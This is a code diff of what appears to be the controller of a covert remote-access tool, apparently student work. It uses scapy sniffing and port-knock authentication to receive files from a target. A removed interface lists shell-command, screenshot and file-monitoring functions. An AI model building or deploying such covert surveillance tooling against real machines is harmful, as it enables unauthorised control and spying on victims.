@@ -16,7 +16,7 @@
 #	LAST REVISED: October 19th 2017
 #  =================================================================
 
-import time, base64, logging, encryption ,configReader, helpers, threading
+import time, base64, logging, encryption ,configReader, helpers, threading, datetime
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import * #sudo apt-get install python-scapy
 from subprocess import *
@@ -128,7 +128,7 @@ def recvFile(packet):
 	#check packet if has IP/Raw layer and also that authentication is passed
 	if state is 3:
 		
-		time.sleep(2)
+		time.sleep(3)
 		#if the IP does not match the authenticated IP
 		if packet[IP].src != fileIP:
 			print "IP didn't match" + "source" + packet[IP].src + "fileIP" + fileIP
@@ -158,20 +158,34 @@ def recvFile(packet):
 		#			fileDescriptor = open(fileName, 'wb')
 		#			fileDescriptor.write(fileData)
 		#			resultsForFiles = ""
+		
 		recvPhoto()
 		state = 0 #reset state for new knock
 					
+#  =================================================================
+#  name: recvPhoto
+#  @param:
+#		none
+#  @return
+#		none
+#  
+#  description: opens a socket for file receival
+#  =================================================================
 def recvPhoto():
 	
 	s = socket.socket()     
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)        # Create a socket object
-	host = configReader.destIP     # Get local machine name
+	
+	#DEBUGGING METHOD HPST
+	host = socket.gethostname()     # Get local machine name #FIX BEFORE EXECUTING DEBUGGING
 	port = 60000                    # Reserve a port for your service.
 
 	s.connect((host, port))
 	s.send("Hello server!")
 
-	with open('received_file', 'wb') as f:
+	now = datetime.now()
+	
+	with open(now.strftime("%Y-%m-%d %H:%M:%S"), 'wb') as f:
 		print 'file opened'
 		while True:
 			print('receiving data...')
@@ -275,55 +289,6 @@ def knock(packet):
 			else:
 				print "Wrong Port Knock Sequence"
 				state = 0	
-				
-def UI(tkRoot):
-	global text
-	
-	root = tkRoot
-	root.title("Client")
-	root.geometry('{}x{}'.format(1200, 1080))
-	
-	
-	#Input
-	buttonFrame = Frame(root)
-	buttonFrame.grid_rowconfigure(0,weight=1)
-	buttonFrame.grid_columnconfigure(0,weight=1)
-	
-	#Entr
-	
-	b1 = Button(root, text='Shell Command',font=("Helvetica", 10),  command=(), width=15)
-	b1.grid(row=0, column=2)
-	
-	b2 = Button(root, text='Screenshot',font=("Helvetica", 10), command=(),width=15)
-	b2.grid(row=1, column=2)
-	
-	b3 = Button(root, text='Monitor File',font=("Helvetica", 10), command=(),width=15)
-	b3.grid(row=2, column=2)
-	
-	b2 = Button(root, text='Stop Monitor',font=("Helvetica", 10), command=(),width=15)
-	b2.grid(row=3, column=2)
-	
-	lab = Label(root, font=("Helvetica", 10), text ="Input: " , anchor ='w')
-	ent = Entry(root,font=("Helvetica", 10),width=50)
-	ent.config(highlightbackground = "gray")
-
-	
-	text = Text(root, state='disabled',width=50,font=("Helvetica", 10))
-	text.configure(state='normal')
-	text.insert('end', 'Some Text')
-	text.configure(state='disabled')
-	text.grid(row=1,column=1,rowspan=100)
-	
-	lab.grid(row=0,column=0, padx=(25,10),pady=15)
-	ent.grid(row=0,column=1,sticky=N+S+W+E,padx=30,pady=15)
-	
-	
-	
-	#row.pack(side=TOP, fill=X, padx=5, pady=5)
-	#lab.pack(side=LEFT)
-	#ent.pack(side=TOP,expand=YES, fill=X)
-
-	root.mainloop()			
 
 
 #  =================================================================
@@ -338,14 +303,10 @@ def UI(tkRoot):
 def main():
 	global fileIP
 	verify_root()
-	
-	
-	#root = Tk()
-	#UI(root)
+
 	
 	#commented out for faster debugging
 	#helpers.portKnock(configReader.destIP)
-
 
 	#sniffing file process
 	fileProcess = Process(target=sniffFile)
